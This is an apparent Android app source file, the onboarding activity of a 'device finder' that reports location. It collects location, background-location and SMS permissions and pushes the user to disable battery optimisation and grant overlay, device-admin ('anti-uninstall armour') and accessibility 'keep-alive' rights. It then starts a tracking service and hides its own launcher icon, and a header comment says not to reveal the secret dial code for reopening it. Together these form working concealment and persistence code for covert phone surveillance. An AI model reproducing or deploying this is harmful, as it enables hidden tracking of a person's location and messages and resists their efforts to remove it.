/*
 * ============================================================
 *  MainActivity.java — 引导流程入口
 * ------------------------------------------------------------
 *  构建版本 : 20261106-1308
 *  协议版本 : v2 (对应 BuildInfo.PROTOCOL_VERSION)
 *  最后修改 : 2026-11-06
 * ------------------------------------------------------------
 *  【本次变更 (2026-11-06)】
 *   - 修复无障碍弹框闪现消失：弹框期间坚决不启动服务，彻底避开系统 Task 栈刷新误杀
 *   - 修复按 Home 键返回导致叠弹框：入口处增加 isAccessibilityDialogShowing 防重入
 *   - 修复服务启动失败导致彻底失联：启动失败时保留桌面图标，并合并 Toast 提示
 *   - 修复设备管理器返回后，系统拉取前台服务导致 onResume 被二次触发误杀弹框的 bug
 *   - 修复无障碍引导"一闪而过"：Dialog 回调内收尾，不再提前 finish()
 *   - 修复 onCreate + onResume 双调用导致弹框叠加
 *   - 修复权限回调 grantResults[0] 死循环（改为遍历全部结果）
 *   - 修复精确闹钟反复询问（alarmAsked 标志，只问一次）
 *   - 修复 API 29 后台定位拒绝死循环（REQ_BG_LOCATION 独立回调）
 *   - 修复通知权限复用 REQ_PERMISSIONS 导致的后台定位回环
 *   - 新增 onSaveInstanceState 状态保存，防系统回收后流程重走
 *
 *  【核心约束（改代码前必读）】
 *   - 无障碍可跳过，不强制
 *   - 无论是否开启无障碍，桌面图标都会隐藏（弹框正文已告知）
 *   - 不提示拨号暗号，用户重进靠"系统设置 → 应用管理 → 打开"
 *   - onCreate 不得调 checkAndRequestPermissions()（会双弹窗）
 *   - 所有"跳设置页"必须用 waitingForXxx 标志，否则返回后状态丢失
 *   - 弹框显示期间，绝对不可启动服务或隐藏图标
 *
 *  【流程概览】
 *   精确闹钟 → 运行时权限 → 后台定位 → 通知权限
 *   → 电池优化 → 悬浮窗 → 设备管理 → 无障碍弹框
 *   → （用户交互后）启动服务 → 隐藏图标 → finish
 *   详见 docs/main-activity-flow.md
 * ============================================================
 */

package com.example.devicefinder;

import android.Manifest;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private static final int REQ_NOTIFICATION = 101;
    private static final int REQ_BG_LOCATION = 102;

    private boolean serviceStarted = false;
    private boolean alarmAsked = false;
    private int permissionRetryCount = 0;
    private boolean isAccessibilityDialogShowing = false; 

    private boolean waitingForAlarmSetting = false;
    private boolean waitingForBgLocSetting = false;
    private boolean waitingForBatterySetting = false;
    private boolean waitingForOverlaySetting = false;
    private boolean waitingForDeviceAdmin = false;
    private boolean waitingForAccessibilitySetting = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        if (getIntent() != null && getIntent().getCategories() != null
                && getIntent().getCategories().contains(Intent.CATEGORY_LAUNCHER)) {
            Toast.makeText(this, "🛡️ 系统服务初始化中", Toast.LENGTH_SHORT).show();
        }

        if (savedInstanceState != null) {
            serviceStarted = savedInstanceState.getBoolean("serviceStarted", false);
            alarmAsked = savedInstanceState.getBoolean("alarmAsked", false);
            permissionRetryCount = savedInstanceState.getInt("permissionRetryCount", 0);
            waitingForBgLocSetting = savedInstanceState.getBoolean("waitingForBgLocSetting", false);
            waitingForBatterySetting = savedInstanceState.getBoolean("waitingForBatterySetting", false);
            waitingForDeviceAdmin = savedInstanceState.getBoolean("waitingForDeviceAdmin", false);
            waitingForOverlaySetting = savedInstanceState.getBoolean("waitingForOverlaySetting", false);
            waitingForAccessibilitySetting = savedInstanceState.getBoolean("waitingForAccessibilitySetting", false);
            waitingForAlarmSetting = savedInstanceState.getBoolean("waitingForAlarmSetting", false);
        }
    }

    @Override
    protected void onSaveInstanceState(Bundle outState) {
        super.onSaveInstanceState(outState);
        outState.putBoolean("serviceStarted", serviceStarted);
        outState.putBoolean("alarmAsked", alarmAsked);
        outState.putInt("permissionRetryCount", permissionRetryCount);
        outState.putBoolean("waitingForBgLocSetting", waitingForBgLocSetting);
        outState.putBoolean("waitingForBatterySetting", waitingForBatterySetting);
        outState.putBoolean("waitingForDeviceAdmin", waitingForDeviceAdmin);
        outState.putBoolean("waitingForOverlaySetting", waitingForOverlaySetting);
        outState.putBoolean("waitingForAccessibilitySetting", waitingForAccessibilitySetting);
        outState.putBoolean("waitingForAlarmSetting", waitingForAlarmSetting);
    }

    @Override
    protected void onResume() {
        super.onResume();

        if (waitingForAlarmSetting) {
            waitingForAlarmSetting = false;
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            boolean ok = am != null && am.canScheduleExactAlarms();
            if (ok) {
                Toast.makeText(this, "✅ 精确闹钟已开启", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未开启精确闹钟，上报时间可能不准", Toast.LENGTH_LONG).show();
            }
            checkAndRequestPermissions();
            return;
        }

        if (waitingForDeviceAdmin) {
            waitingForDeviceAdmin = false;
            android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(adminComponent)) {
                Toast.makeText(this, "✅ 防卸载装甲已激活", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "⚠️ 未激活防卸载，应用将直接启动", Toast.LENGTH_LONG).show();
            }
            checkAndOpenAccessibilitySettingsAndFinish();
            return;
        }

        if (waitingForOverlaySetting) {
            waitingForOverlaySetting = false;
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "✅ 悬浮窗权限已开启", Toast.LENGTH_SHORT).show();
            }
            checkDeviceAdmin();
            return;
        }

        if (waitingForBatterySetting) {
            waitingForBatterySetting = false;
            if (isBatteryOptimizationIgnored()) {
                Toast.makeText(this, "✅ 电池优化已关闭", Toast.LENGTH_SHORT).show();
                checkOverlayPermission();
            } else {
                promptBatteryOptimizationAgain();
            }
            return;
        }

        if (waitingForBgLocSetting) {
            waitingForBgLocSetting = false;
            proceedAfterBackgroundLocation();
            return;
        }

        if (waitingForAccessibilitySetting) {
            waitingForAccessibilitySetting = false;
            if (isAccessibilityServiceEnabled()) {
                FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍已开启（从设置返回）");
                finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            } else {
                FileLogger.log(this, "ACCESSIBILITY", "⚠️ 从设置返回但未开启无障碍");
                finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
            }
            return;
        }

        if (serviceStarted) {
            if (isAccessibilityDialogShowing) {
                return;
            }
            finish();
            return;
        }

        checkAndRequestPermissions();
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < 23) {
            proceedAfterPermissions();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S && !alarmAsked) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            if (alarmManager != null && !alarmManager.canScheduleExactAlarms()) {
                alarmAsked = true;
                new AlertDialog.Builder(this)
                        .setTitle("建议允许精确闹钟")
                        .setMessage("允许精确闹钟后，手机息屏时定位上报会更准点。\n\n"
                                + "• 点击「去设置」→ 开启「闹钟和提醒」\n"
                                + "• 点击「暂不开启」→ 仍可运行，但上报时间可能有几分钟偏差")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForAlarmSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForAlarmSetting = false;
                                Toast.makeText(this, "无法打开精确闹钟设置", Toast.LENGTH_SHORT).show();
                                checkAndRequestPermissions();
                            }
                        })
                        .setNegativeButton("暂不开启", (dialog, which) -> checkAndRequestPermissions())
                        .show();
                return;
            }
        }

        boolean needFgLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED;
        boolean needNotif = Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED;
        boolean needSms = checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                          checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED;
        boolean needActivity = Build.VERSION.SDK_INT >= 29 && checkSelfPermission(Manifest.permission.ACTIVITY_RECOGNITION) != PackageManager.PERMISSION_GRANTED;
        boolean needNearbyWifi = Build.VERSION.SDK_INT >= 33
                && checkSelfPermission("android.permission.NEARBY_WIFI_DEVICES") != PackageManager.PERMISSION_GRANTED;

        if (needFgLoc || needNotif || needSms || needActivity || needNearbyWifi) {
            if (permissionRetryCount >= 2) {
                checkBgLocThenProceed();
                return;
            }
            permissionRetryCount++;

            java.util.List<String> perms = new java.util.ArrayList<>();
            if (needFgLoc) {
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
            }
            if (needSms) {
                perms.add(Manifest.permission.RECEIVE_SMS);
                perms.add(Manifest.permission.SEND_SMS);
            }
            if (needActivity) {
                perms.add(Manifest.permission.ACTIVITY_RECOGNITION);
            }
            if (needNotif) {
                perms.add(Manifest.permission.POST_NOTIFICATIONS);
            }
            if (needNearbyWifi) {
                perms.add("android.permission.NEARBY_WIFI_DEVICES");
            }
            requestPermissions(perms.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            checkBgLocThenProceed();
        }
    }

    private void checkBgLocThenProceed() {
        boolean needBgLoc = Build.VERSION.SDK_INT >= 29
                && checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED;

        if (needBgLoc) {
            if (Build.VERSION.SDK_INT >= 30) {
                new AlertDialog.Builder(this)
                        .setTitle("设置后台定位")
                        .setMessage("请在下个页面选择「权限」→「位置信息」→「始终允许」。")
                        .setCancelable(false)
                        .setPositiveButton("去设置", (dialog, which) -> {
                            waitingForBgLocSetting = true;
                            try {
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                intent.setData(Uri.parse("package:" + getPackageName()));
                                startActivity(intent);
                            } catch (Exception e) {
                                waitingForBgLocSetting = false;
                                proceedAfterBackgroundLocation();
                            }
                        }).show();
            } else {
                requestPermissions(
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        REQ_BG_LOCATION);
            }
            return;
        }

        proceedAfterPermissions();
    }

    private void proceedAfterBackgroundLocation() {
        boolean bgLocOk = Build.VERSION.SDK_INT < 29
                || checkSelfPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!bgLocOk) {
            new AlertDialog.Builder(this)
                    .setTitle("后台定位未开启")
                    .setMessage("锁屏后可能无法定位。是否重新去设置？\n\n"
                            + "进入后请找到「位置信息」→ 选择「始终允许」。")
                    .setCancelable(false)
                    .setPositiveButton("再去设置", (dialog, which) -> {
                        waitingForBgLocSetting = true;
                        try {
                            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForBgLocSetting = false;
                            FileLogger.log(this, "LOCATION",
                                    "⚠️ 打开后台定位设置失败: " + e.getMessage());
                            checkNotifThenProceed();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启后台定位，锁屏后可能无法定位", Toast.LENGTH_LONG).show();
                        checkNotifThenProceed();
                    })
                    .show();
            return;
        }

        checkNotifThenProceed();
    }

    private void checkNotifThenProceed() {
        if (Build.VERSION.SDK_INT >= 33
                && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, REQ_NOTIFICATION);
        } else {
            proceedAfterPermissions();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQ_BG_LOCATION) {
            proceedAfterBackgroundLocation();
            return;
        }

        if (requestCode == REQ_NOTIFICATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "✅ 通知权限已开启", Toast.LENGTH_SHORT).show();
            }
            proceedAfterPermissions();
            return;
        }

        if (requestCode != REQ_PERMISSIONS) return;

        boolean allGranted = grantResults.length > 0;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }

        if (allGranted) {
            permissionRetryCount = 0;
            checkAndRequestPermissions();
        } else {
            Toast.makeText(this, "⚠️ 部分权限未授予，可能影响后台存活", Toast.LENGTH_LONG).show();
            checkBgLocThenProceed();
        }
    }

    private void proceedAfterPermissions() {
        if (isBatteryOptimizationIgnored()) {
            checkOverlayPermission();
        } else {
            promptBatteryOptimization();
        }
    }

    private boolean isBatteryOptimizationIgnored() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm != null && pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Exception e) {
            return false;
        }
    }

    private void promptBatteryOptimization() {
        new AlertDialog.Builder(this)
                .setTitle("必须关闭电池优化")
                .setMessage("为保证息屏后仍能持续上报位置，\n请将本应用设为「不限制」。")
                .setCancelable(false)
                .setPositiveButton("去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("暂时跳过", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void promptBatteryOptimizationAgain() {
        new AlertDialog.Builder(this)
                .setTitle("电池优化仍未关闭")
                .setMessage("系统限制尚未解除，息屏后可能无法定位。")
                .setCancelable(false)
                .setPositiveButton("再去设置", (dialog, which) -> {
                    waitingForBatterySetting = true;
                    openBatteryOptimizationSettings();
                })
                .setNegativeButton("放弃", (dialog, which) -> checkOverlayPermission()).show();
    }

    private void openBatteryOptimizationSettings() {
        try {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
            } else {
                startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
            }
        } catch (Exception e) {
            waitingForBatterySetting = false;
            checkOverlayPermission();
        }
    }

    private void checkOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启悬浮窗权限")
                    .setMessage("用于提升后台存活率和显示提示，请在下一页允许「显示在其他应用上层」。")
                    .setCancelable(false)
                    .setPositiveButton("去开启", (dialog, which) -> {
                        waitingForOverlaySetting = true;
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> checkDeviceAdmin()).show();
        } else {
            checkDeviceAdmin();
        }
    }

    private void checkDeviceAdmin() {
        android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, MyDeviceAdminReceiver.class);

        if (dpm != null && !dpm.isAdminActive(adminComponent)) {
            new AlertDialog.Builder(this)
                    .setTitle("开启防卸载保护")
                    .setMessage("为防止应用被恶意卸载，请在下个页面点击「激活」。")
                    .setCancelable(false)
                    .setPositiveButton("去激活", (dialog, which) -> {
                        waitingForDeviceAdmin = true;
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "激活后可防止应用被轻易卸载");
                        try {
                            startActivity(intent);
                        } catch (Exception e) {
                            waitingForDeviceAdmin = false;
                            checkAndOpenAccessibilitySettingsAndFinish();
                        }
                    })
                    .setNegativeButton("暂不开启", (dialog, which) -> {
                        Toast.makeText(this, "⚠️ 未开启防卸载保护", Toast.LENGTH_LONG).show();
                        checkAndOpenAccessibilitySettingsAndFinish();
                    }).show();
        } else {
            checkAndOpenAccessibilitySettingsAndFinish();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
        try {
            String enabledServices = Settings.Secure.getString(
                    getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices == null) return false;
            for (String s : enabledServices.split(":")) {
                if (s.equalsIgnoreCase(service)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    /**
     * 启动服务，成功返回 true，失败返回 false 并记日志（由调用方决定如何提示用户）
     */
    private boolean startTrackingServiceOnly() {
        if (serviceStarted) return true;
        serviceStarted = true;
        Intent intent = new Intent(this, TrackingService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            return true;
        } catch (Exception e) {
            serviceStarted = false;
            FileLogger.log(this, "START_SERVICE", "启动失败: " + e);
            return false;
        }
    }

    private void checkAndOpenAccessibilitySettingsAndFinish() {
        if (isFinishing() || isDestroyed()) return;
        if (isAccessibilityDialogShowing) return; // 防重入

        if (isAccessibilityServiceEnabled()) {
            FileLogger.log(this, "ACCESSIBILITY", "✅ 无障碍服务已开启（跳过引导）");
            finishWithToast("✅ 设置完成，无障碍服务已开启", Toast.LENGTH_LONG);
            return;
        }

        isAccessibilityDialogShowing = true;

        new AlertDialog.Builder(this)
                .setTitle("开启无障碍保活服务（推荐）")
                .setMessage("为保证 App 被系统清理后能自动复活，推荐开启无障碍服务。\n\n"
                        + "• 点击「去开启」跳转到无障碍设置，找到【" + getString(R.string.app_name) + "】并勾选开启\n"
                        + "• 点击「暂不开启」或按返回键跳过本次引导\n\n"
                        + "无论是否开启，完成后桌面图标都会自动隐藏。")
                .setCancelable(true)
                .setPositiveButton("去开启", (dialog, which) -> {
                    isAccessibilityDialogShowing = false;
                    waitingForAccessibilitySetting = true;
                    
                    // 此时即将切到外部设置页，启动服务不会干扰 UI
                    boolean ok = startTrackingServiceOnly();
                    if (!ok) {
                        Toast.makeText(this, "服务启动失败，但请先完成无障碍设置", Toast.LENGTH_LONG).show();
                    }
                    
                    try {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (Exception e) {
                        waitingForAccessibilitySetting = false;
                        FileLogger.log(this, "ACCESSIBILITY", "⚠️ 无法打开无障碍设置: " + e.getMessage());
                        finishWithToast("设置无法打开", Toast.LENGTH_SHORT);
                    }
                })
                .setNegativeButton("暂不开启", (dialog, which) -> {
                    isAccessibilityDialogShowing = false;
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户主动跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .setOnCancelListener(dialog -> {
                    isAccessibilityDialogShowing = false;
                    FileLogger.log(this, "ACCESSIBILITY", "⚠️ 用户按返回键跳过无障碍");
                    finishWithToast("✅ 设置完成，无障碍未开启", Toast.LENGTH_LONG);
                })
                .show();
    }

    private void finishWithToast(String msg, int duration) {
        boolean serviceOk = startTrackingServiceOnly();
        if (serviceOk) {
            try {
                hideLauncherIcon();
            } catch (Exception e) {
                FileLogger.log(this, "ICON", "隐藏图标失败: " + e);
            }
        } else {
            // 合并 Toast 提示，防止连弹三个
            msg = msg + "\n⚠️ 服务启动失败，已保留桌面图标";
            duration = Toast.LENGTH_LONG;
        }
        
        Toast.makeText(getApplicationContext(), msg, duration).show();
        finish();
    }

    private void hideLauncherIcon() {
        FileLogger.log(this, "ICON", "隐藏桌面图标");
        LauncherIconUtils.setLauncherIconVisible(this, false);
    }
}
